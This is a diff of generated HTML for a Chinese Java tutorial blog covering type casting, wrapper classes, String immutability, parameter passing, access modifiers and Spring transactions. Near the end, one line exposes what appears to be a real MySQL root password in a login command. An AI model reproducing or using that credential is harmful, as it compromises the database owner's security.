+<li>转换顺序从低级到高级</li>
+</ul>
+<p>byte,short,char—&gt; int —&gt; long—&gt; float —&gt; double</p>
+<ul>
+<li>将大容量强转为小容量，会损失精度</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int i = 128;</span><br><span class="line">(byte) i; // -128</span><br></pre></td></tr></table></figure>
+<ul>
+<li>浮点数转为整数，舍弃小数部分</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">float f = 12.55f;</span><br><span class="line">(int)f; // 12</span><br></pre></td></tr></table></figure>
+<h3 id="3-包装类型"><a href="#3-包装类型" class="headerlink" title="3.包装类型"></a>3.包装类型</h3><p>基本数据类型：byte，int， short， long, boolean，char, float，double等<br></p>
+<p>包装类型： Byte，Integer，Short，Long，Boolean，Character，Float,Double等<br></p>
+<ul>
+<li>为什么要有包装类 ?</li>
+</ul>
+<p>Java语言是一个面向对象的语言,但Java中的基本数据类型却是不面向对象的。例如:集合类中只能存放对象List\&lt;Integer>, 不能存放基本类型数据List\&lt;int>。</p>
+<ul>
+<li>怎么用 ?</li>
+</ul>
+<p>基本类型与其包装类之间转换:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/** 将int类型转换为Integer类型*/</span><br><span class="line">int intNum = 10;</span><br><span class="line">Integer integer = new Integer(intNum);</span><br><span class="line">/** 将Integer类型转换为int类型*/</span><br><span class="line">int intValue = integer.intValue();</span><br></pre></td></tr></table></figure></p>
+<p>实际上Jdk有自动装包/拆包机制，不需要我们手动进行转换.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/** int类型会自动转换为Integer类型*/</span><br><span class="line">int n = 12;</span><br><span class="line">Integer m = n;</span><br></pre></td></tr></table></figure></p>
+<h2 id="二-引用数据类型"><a href="#二-引用数据类型" class="headerlink" title="二.引用数据类型"></a>二.引用数据类型</h2><ul>
+<li>引用数据类型包括: 类/接口和数组.<br></li>
+</ul>
+<p>如 String s = “123”; 类型为 java.lang.String 类<br></p>
+<ul>
+<li>引用类型的默认值为null</li>
+</ul>
+<h2 id="三-其它"><a href="#三-其它" class="headerlink" title="三.其它"></a>三.其它</h2><h3 id="1-关于String不可变"><a href="#1-关于String不可变" class="headerlink" title="1.关于String不可变"></a>1.关于String不可变</h3><ul>
+<li>理解String中的变与不变</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String s = &quot;123&quot;;</span><br><span class="line">System.out.println(System.identityHashCode(s)); //1650967483</span><br><span class="line">s += &quot;456&quot;;</span><br><span class="line">System.out.println(System.identityHashCode(s)); //87285178</span><br></pre></td></tr></table></figure>
+<p>String为不可变，所以创建后 s = “123”,就不再变化。<br><br>那我们为什么能重新给它赋值呢? 实际上是，新建了一个String，s指向了新的地址引用<br>.</p>
+<ul>
+<li>为什么不可变 ?</li>
+</ul>
+<p>String 类为 public <front color="#CB4335">final</front> class String{}<br><br>可见，String类被定义成了final，所以String不可变.<br></p>
+<ul>
+<li>为什么要不可变 ?</li>
+</ul>
+<p>1.用于Hash<br></p>
+<p>因为String的hash值(用来标明不同对象)经常被用到,例如Map的key，不可变的特性使hash值也可保持不变，不用每次都计算hash值.<br></p>
+<p>2.用于线程安全<br></p>
+<p>因为String不可变，天生具备线程安全,无论多少个线程操作，都不会改变其值。<br></p>
+<p>3.用于String pool<br></p>
+<p>JVM （heap中）维护着一个String pool(字符串常量池),保存着所有字符串字面量.<br><br>如果一个 String 对象已经被创建过了，那么就会从 String Pool 中取得引用。只有 String 是不可变的，才可能使用 String Pool。<br></p>
+<p>当一个字符串调用 intern() 方法时，如果 String Pool 中已经存在一个字符串和该字符串值相等（使用 equals() 方法进行确定），那么就会返回 String Pool 中字符串的引用；否则，就会在 String Pool 中添加一个新的字符串，并返回这个新字符串的引用。<br></p>
+<p>下面示例中，s1 和 s2 采用 new String() 的方式新建了两个不同字符串，而 s3 和 s4 是通过 s1.intern() 方法取得一个字符串引用。intern() 首先把 s1 引用的字符串放到 String Pool 中，然后返回这个字符串引用。因此 s3 和 s4 引用的是同一个字符串。<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String s1 = new String(&quot;aaa&quot;);</span><br><span class="line">String s2 = new String(&quot;aaa&quot;);</span><br><span class="line">System.out.println(s1 == s2);           // false</span><br><span class="line">String s3 = s1.intern();</span><br><span class="line">String s4 = s1.intern();</span><br><span class="line">System.out.println(s3 == s4);           // true;</span><br></pre></td></tr></table></figure></p>
+<p>如果是采用 “bbb” 这种字面量的形式创建字符串，会自动地将字符串放入 String Pool 中。<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String s5 = &quot;bbb&quot;;//不存在，创建</span><br><span class="line">String s6 = &quot;bbb&quot;;//已存在，获得引用</span><br><span class="line">System.out.println(s5 == s6);  // true</span><br></pre></td></tr></table></figure></p>
+<p>4.方便其它对象使用<br></p>
+<p>如一个Set中存着String类型的值，要保证Set中的值不可变。如下，按照原则，Set中的值应该不可变，如果a的值改变了，明显违反了规则。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HashSet&lt;String&gt; set = new HashSet&lt;String&gt;();</span><br><span class="line">set.add(new String(&quot;a&quot;));</span><br><span class="line">set.add(new String(&quot;b&quot;));</span><br><span class="line">set.add(new String(&quot;c&quot;));</span><br><span class="line"></span><br><span class="line">for(String a: set)</span><br><span class="line">	a.value = &quot;a&quot;;</span><br></pre></td></tr></table></figure></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">java</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/06/17/java/base/java基本数据类型/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-java/base/理解java中的参数传递" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/06/17/java/base/理解java中的参数传递/">java参数传递</a>
+    </h1>
+  
+
+        
+        <a href="/2019/06/17/java/base/理解java中的参数传递/" class="archive-article-date">
+  	<time datetime="2019-06-17T03:26:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-17</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><a href="https://blog.csdn.net/jiangnan2014/article/details/22944075" target="_blank" rel="noopener">https://blog.csdn.net/jiangnan2014/article/details/22944075</a></p>
+<p><a href="https://juejin.im/post/5bce68226fb9a05ce46a0476" target="_blank" rel="noopener">https://juejin.im/post/5bce68226fb9a05ce46a0476</a></p>
+<h2 id="1-参数传递"><a href="#1-参数传递" class="headerlink" title="1.参数传递"></a>1.参数传递</h2><p>参数传递分为引用传递和值传递.</p>
+<ul>
+<li>值传递</li>
+</ul>
+<p>方法接收的是调用着提供的值</p>
+<ul>
+<li>引用传递</li>
+</ul>
+<p>方法接收的是调用者提供的变量地址</p>
+<p>这里我们需要注意的是一个方法可以修改 引用传递 所对应的变量值，而不能修改 值传递 所对应的变量值，这是按值调用与引用调用的根本区别。</p>
+<h2 id="2-Java中的参数传递"><a href="#2-Java中的参数传递" class="headerlink" title="2.Java中的参数传递"></a>2.Java中的参数传递</h2><h3 id="1-例子"><a href="#1-例子" class="headerlink" title="1.例子:"></a>1.例子:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">public class MyTest &#123;</span><br><span class="line"></span><br><span class="line">    class User&#123;</span><br><span class="line">        private String userName;</span><br><span class="line">        private String userId;</span><br><span class="line"></span><br><span class="line">        public void setUserName(String userName)&#123;</span><br><span class="line">            this.userName = userName;</span><br><span class="line">        &#125;</span><br><span class="line">        public void setUserId(String userId)&#123;</span><br><span class="line">            this.userId = userId;</span><br><span class="line">        &#125;</span><br><span class="line">        public String getUser()&#123;</span><br><span class="line">           return &quot;name: &quot; + this.userName + &quot;  id: &quot; + this.userId;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void transTest(User user)&#123;</span><br><span class="line">        user.setUserName(&quot;传递&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void transTest2(int value)&#123;</span><br><span class="line">        value = value * 2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void transTest3(String value)&#123;</span><br><span class="line">        value = value  + &quot;-changed&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void transTest4(StringBuffer value)&#123;</span><br><span class="line">        value.append(&quot;-changed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void transTest5(char ch)&#123;</span><br><span class="line">        ch = &apos;2&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line"></span><br><span class="line">        //测试1</span><br><span class="line">        User user = new MyTest().new User();</span><br><span class="line">        user.setUserId(&quot;01&quot;);</span><br><span class="line">        System.out.println(&quot;传递前的值: &quot; + user.getUser());</span><br><span class="line">        transTest(user);</span><br><span class="line">        System.out.println(&quot;传递后的值: &quot; + user.getUser());</span><br><span class="line"></span><br><span class="line">        //测试2</span><br><span class="line">        System.out.println();</span><br><span class="line">        int num = 2;</span><br><span class="line">        System.out.println(&quot;传递前的值: &quot; + num);</span><br><span class="line">        transTest2(num);</span><br><span class="line">        System.out.println(&quot;传递后的值: &quot; + num);</span><br><span class="line"></span><br><span class="line">        //测试3</span><br><span class="line">        System.out.println();</span><br><span class="line">        String s = &quot;123&quot;;</span><br><span class="line">        System.out.println(&quot;传递前的值: &quot; + s);</span><br><span class="line">        transTest3(s);</span><br><span class="line">        System.out.println(&quot;传递后的值: &quot; + s);</span><br><span class="line"></span><br><span class="line">        //测试4</span><br><span class="line">        System.out.println();</span><br><span class="line">        StringBuffer sb = new StringBuffer(&quot;123&quot;);</span><br><span class="line">        System.out.println(&quot;传递前的值: &quot; + sb.toString());</span><br><span class="line">        transTest4(sb);</span><br><span class="line">        System.out.println(&quot;传递后的值: &quot; + sb);</span><br><span class="line"></span><br><span class="line">        //测试5</span><br><span class="line">        System.out.println();</span><br><span class="line">        char ch = &apos;1&apos;;</span><br><span class="line">        System.out.println(&quot;传递前的值: &quot; + ch);</span><br><span class="line">        transTest5(ch);</span><br><span class="line">        System.out.println(&quot;传递后的值: &quot; + ch);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>结果:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">传递前的值: name: null  id: 01</span><br><span class="line">传递后的值: name: 传递  id: 01</span><br><span class="line"></span><br><span class="line">传递前的值: 2</span><br><span class="line">传递后的值: 2</span><br><span class="line"></span><br><span class="line">传递前的值: 123</span><br><span class="line">传递后的值: 123</span><br><span class="line"></span><br><span class="line">传递前的值: 123</span><br><span class="line">传递后的值: 123-changed</span><br><span class="line"></span><br><span class="line">传递前的值: 1</span><br><span class="line">传递后的值: 1</span><br></pre></td></tr></table></figure></p>
+<h3 id="2-结论"><a href="#2-结论" class="headerlink" title="2.结论"></a>2.结论</h3><p>先来结论:<br></p>
+<p>1.java的参数传递都是传值，没有传引用.<br></p>
+<p>2.对引用类型的传参，传的是引用类型的值(地址的值).<br></p>
+<h3 id="3-分析"><a href="#3-分析" class="headerlink" title="3.分析"></a>3.分析</h3><p>从结果来看:<br></p>
+<ul>
+<li>测试2和测试5</li>
+</ul>
+<p>参数基本类型参数，传的是实参的值的一个拷贝，所以传递过后，方法内部对拷贝的值进行操作，实参本身值不变。</p>
+<ul>
+<li>测试1和测试4</li>
+</ul>
+<p>参数是引用类型，传的是变量的拷贝(地址)，所以在方法内进行修改，会将对应地址的信息进行修改，在外层打印时，打印的是地址中的信息(已被修改).</p>
+<ul>
+<li>测试3</li>
+</ul>
+<p>参数是引用类型，但是String不可变，对String的修改会新建一个对象.</p>
+<h3 id="4-疑惑-传地址为什么是传值，而不是传引用？"><a href="#4-疑惑-传地址为什么是传值，而不是传引用？" class="headerlink" title="4.疑惑: 传地址为什么是传值，而不是传引用？"></a>4.疑惑: 传地址为什么是传值，而不是传引用？</h3><p><a href="https://www.zhihu.com/question/31203609" target="_blank" rel="noopener">https://www.zhihu.com/question/31203609</a><br>知乎高赞讲解，一看就懂。<br></p>
+<h4 id="1-类型区别"><a href="#1-类型区别" class="headerlink" title="(1)类型区别"></a>(1)类型区别</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int num = 10; //基本类型</span><br><span class="line">String str = &quot;hello&quot;; //引用类型</span><br></pre></td></tr></table></figure>
+<p><img src="http://67.216.218.49:8000/file/blogs/java/base/paramsTransfer1.jpg" alt="transfer1"><br>如图：num是基本类型，值就直接保存在变量中。而str是引用类型，变量中保存的只是实际对象的地址。一般称这种变量为”引用”，引用指向实际对象，实际对象中保存着内容。</p>
+<h4 id="2-赋值的作用"><a href="#2-赋值的作用" class="headerlink" title="(2)= 赋值的作用"></a>(2)= 赋值的作用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">num = 20;</span><br><span class="line">str = &quot;java&quot;;</span><br></pre></td></tr></table></figure>
+<p><img src="http://67.216.218.49:8000/file/blogs/java/base/paramsTransfer2.jpg" alt="transfer2"><br>对于基本类型 num ，赋值运算符会直接改变变量的值，原来的值被覆盖掉。<br>对于引用类型 str，赋值运算符会改变引用中所保存的地址，原来的地址被覆盖掉。但是原来的对象不会被改变（重要）。</p>
+<h4 id="3-调用方法时的参数传递"><a href="#3-调用方法时的参数传递" class="headerlink" title="(3).调用方法时的参数传递"></a>(3).调用方法时的参数传递</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">StringBuilder sb = new StringBuilder(&quot;iphone&quot;);</span><br><span class="line">void foo(StringBuilder builder) &#123;</span><br><span class="line">    builder.append(&quot;4&quot;);</span><br><span class="line">&#125;</span><br><span class="line">foo(sb); // sb 被改变了，变成了&quot;iphone4&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">StringBuilder sb = new StringBuilder(&quot;iphone&quot;);</span><br><span class="line">void foo(StringBuilder builder) &#123;</span><br><span class="line">    builder = new StringBuilder(&quot;ipad&quot;);</span><br><span class="line">&#125;</span><br><span class="line">foo(sb); // sb 没有被改变，还是 &quot;iphone&quot;。</span><br></pre></td></tr></table></figure>
+<p><img src="http://67.216.218.49:8000/file/blogs/java/base/paramsTransfer3.jpg" alt="transfer3"><br>引用类型时，传递了变量的一份拷贝，(存储着地址的值)，然后进行修改操作后，修改了地址中的信息.</p>
+<p><img src="http://67.216.218.49:8000/file/blogs/java/base/paramsTransfer4.jpg" alt="transfer4"><br>new StringBuilder()时，创建了一个新的地址，原地址信息还是没有改变.</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/06/17/java/base/理解java中的参数传递/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-java/base/java访问权限" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/06/17/java/base/java访问权限/">java访问权限</a>
+    </h1>
+  
+
+        
+        <a href="/2019/06/17/java/base/java访问权限/" class="archive-article-date">
+  	<time datetime="2019-06-17T03:26:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-17</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="1-权限"><a href="#1-权限" class="headerlink" title="1.权限"></a>1.权限</h3><p>private,default,protected,public<br><br>protected 用于修饰成员，表示在继承体系中成员对于子类可见，但是这个访问修饰符对于类没有意义。<br></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center"></th>
+<th style="text-align:center">同一个类</th>
+<th style="text-align:center">同一个包</th>
+<th style="text-align:center">不同包的子类</th>
+<th style="text-align:center">不同包的非子类</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">private</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">default</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">protected</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">public</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">√</td>
+</tr>
+</tbody>
+</table>
+<h3 id="2-意义"><a href="#2-意义" class="headerlink" title="2.意义"></a>2.意义</h3><p>设计良好的模块会隐藏所有的实现细节，把它的 API 与它的实现清晰地隔离开来。模块之间只通过它们的 API 进行通信，一个模块不需要知道其他模块的内部工作情况，这个概念被称为信息隐藏或封装。因此访问权限应当尽可能地使每个类或者成员不被外界访问。</p>
+<p>如果子类的方法重写了父类的方法，那么子类中该方法的访问级别不允许低于父类的访问级别。这是为了确保可以使用父类实例的地方都可以使用子类实例，也就是确保满足里氏替换原则。</p>
+<p>字段决不能是公有的，因为这么做的话就失去了对这个字段修改行为的控制，客户端可以对其随意修改。例如下面的例子中，AccessExample 拥有 id 公有字段，如果在某个时刻，我们想要使用 int 存储 id 字段，那么就需要修改所有的客户端代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public class Example &#123;</span><br><span class="line">    //public String id;  false</span><br><span class="line">    private String id;   true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">java</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/06/17/java/base/java访问权限/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-java/spring事务" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/06/10/java/spring事务/">spring中事务</a>
+    </h1>
+  
+
+        
+        <a href="/2019/06/10/java/spring事务/" class="archive-article-date">
+  	<time datetime="2019-06-10T07:53:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>——————-修改于2019/12/17————–</p>
+<h1 id="一-事务"><a href="#一-事务" class="headerlink" title="一.事务"></a>一.事务</h1><h2 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h2><p>事务（Transaction）是并发控制的单位，是用户定义的一个操作序列。这些操作要么都做且操作成功，要么都不做。</p>
+<h2 id="2-四个特点"><a href="#2-四个特点" class="headerlink" title="2.四个特点"></a>2.四个特点</h2><ul>
+<li>原子性 (Atomicity)</li>
+</ul>
+<p>事务的原子性是指事务中包含的所有操作要么全做，要么全不做</p>
+<ul>
+<li>一致性 (Consistency)</li>
+</ul>
+<p>在事务开始以前，数据库处于一致性的状态，事务结束后，数据库也必须处于一致性状态。</p>
+<ul>
+<li>隔离性 (Isolation)</li>
+</ul>
+<p>事务不受其他并发执行的事务的影响</p>
+<ul>
+<li>持续性 (Durability)</li>
+</ul>
+<p>一个事务一旦成功完成，它对数据库的改变必须是永久的</p>
+<h1 id="二-Spring中事务"><a href="#二-Spring中事务" class="headerlink" title="二.Spring中事务"></a>二.Spring中事务</h1><h2 id="1-几个属性"><a href="#1-几个属性" class="headerlink" title="1.几个属性"></a>1.几个属性</h2><ul>
+<li>Propagation 传播属性</li>
+</ul>
+<p><a href="https://blog.csdn.net/yanyan19880509/article/details/53041564" target="_blank" rel="noopener">https://blog.csdn.net/yanyan19880509/article/details/53041564</a></p>
+<ul>
+<li>Isolation 隔离属性</li>
+</ul>
+<p><a href="https://www.jianshu.com/p/6ffbd0a8b0b7" target="_blank" rel="noopener">https://www.jianshu.com/p/6ffbd0a8b0b7</a></p>
+<ul>
+<li>Timeout</li>
+</ul>
+<p>一个事务所允许执行的最长时间，如果超过该时间限制但事务还没有完成，则自动回滚事务</p>
+<ul>
+<li>Read-only</li>
+</ul>
+<p>只读事务，事务中只读取，不能修改数据。</p>
+<h2 id="2-例子"><a href="#2-例子" class="headerlink" title="2.例子"></a>2.例子</h2><h3 id="1-pom-xml"><a href="#1-pom-xml" class="headerlink" title="1.pom.xml"></a>1.pom.xml</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- mybatis配置 --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.3.2&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;!-- end mybatis --&gt;</span><br><span class="line">&lt;!-- mysql驱动 --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;mysql&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;</span><br><span class="line">    &lt;scope&gt;runtime&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;!-- end mysql --&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="2-EnableTransactionManagement"><a href="#2-EnableTransactionManagement" class="headerlink" title="2.@EnableTransactionManagement"></a>2.@EnableTransactionManagement</h3><p>启动类打开@EnableTransactionManagement注解</p>
+<h3 id="3-使用事务"><a href="#3-使用事务" class="headerlink" title="3.使用事务"></a>3.使用事务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">@Transactional(readOnly = false, rollbackFor = &#123; Exception.class &#125;)</span><br><span class="line">public void function1()&#123;</span><br><span class="line">   sql1;</span><br><span class="line">   sql2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@Transactional(readOnly = false, rollbackFor = &#123; Exception.class &#125;)</span><br><span class="line"> public void function2()&#123;</span><br><span class="line">     try&#123;</span><br><span class="line">        sql1;</span><br><span class="line">        sql2;  </span><br><span class="line">     &#125;catch (Exception e)&#123;</span><br><span class="line">       //因为已经catch了 异常，所以事务捕捉不到</span><br><span class="line">       //手动调用回滚</span><br><span class="line">        TransactionAspectSupport.currentTransactionStatus().setRollbackOnly();</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>mysql -uroot -pboncQ!W@E#admin</p>
+<p>CREATE TABLE <code>rep_source_data_industry_region</code>  (<br>  <code>id</code> bigint(20) NULL DEFAULT NULL,<br>  <code>rep_project_name</code> text CHARACTER SET utf8 COLLATE utf8_general_ci NULL,<br>  <code>hangye</code> text CHARACTER SET utf8 COLLATE utf8_general_ci NULL,<br>  <code>city</code> text CHARACTER SET utf8 COLLATE utf8_general_ci NULL,<br>  <code>district</code> text CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;</p>
